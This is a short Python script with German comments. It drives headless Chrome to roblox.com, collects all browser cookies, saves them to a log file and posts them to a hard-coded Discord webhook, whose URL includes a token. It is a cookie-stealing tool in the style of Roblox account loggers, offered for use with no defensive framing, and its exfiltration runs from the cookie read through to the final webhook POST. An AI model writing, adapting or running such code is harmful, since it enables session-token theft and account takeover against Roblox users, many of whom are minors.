from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import requests

# Ersetze dies durch deinen Discord-WebHook-URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Pfad zum WebDriver
driver_path = '/path/to/chromedriver'  # Ersetze dies durch den tatsächlichen Pfad

# Chrome-Optionen konfigurieren
chrome_options = Options()
chrome_options.add_argument("--headless")  # Führe Chrome im Hintergrund aus

# Erstelle einen Service für den WebDriver
service = Service(driver_path)

# Initialisiere den WebDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

# Öffne Roblox-Website
driver.get('https://www.roblox.com')

# Hole alle Cookies
cookies = driver.get_cookies()

# Speichere die Cookies in einer Datei
with open('log.txt', 'w') as file:
    for cookie in cookies:
        file.write(f"{cookie['name']}: {cookie['value']}\n")

# Schließe den Browser
driver.quit()

# Lies die Cookies aus der Datei
with open('log.txt', 'r') as file:
    log_data = file.read()

# Bereite die Nachricht für den WebHook vor
payload = {
    'content': f'Cookies:\n{log_data}'
}

# Sende die Nachricht an Discord
requests.post(WEBHOOK_URL, json=payload)
